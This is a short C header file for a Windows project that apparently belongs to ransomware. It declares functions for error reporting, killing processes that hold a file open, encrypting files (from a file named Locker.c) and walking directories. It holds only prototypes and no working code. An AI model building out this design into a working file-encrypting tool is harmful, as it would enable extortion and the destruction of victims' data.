#pragma once


#include <Windows.h>


#ifndef COMMON_H
#define COMMON_H



// print error messages & info [from Debug.c]
BOOL ReportError(CONST CHAR* FuncName, CONST CHAR* ApiName);
BOOL ReportErrorEx(CONST CHAR* FuncName, CONST CHAR* ApiName, DWORD dwError);


// kill process opening a file [from KillParent.c]
BOOL KillParentProcess(IN LPCWSTR FileName);


// do the actual encryption part [from Locker.c]
BOOL InstallEncryption(IN LPWSTR szFileName);

// loop through all the files in a given directory [from Search.c]
BOOL FetchFilesFromDirs(IN LPWSTR Dir);

#endif // !COMMON_H


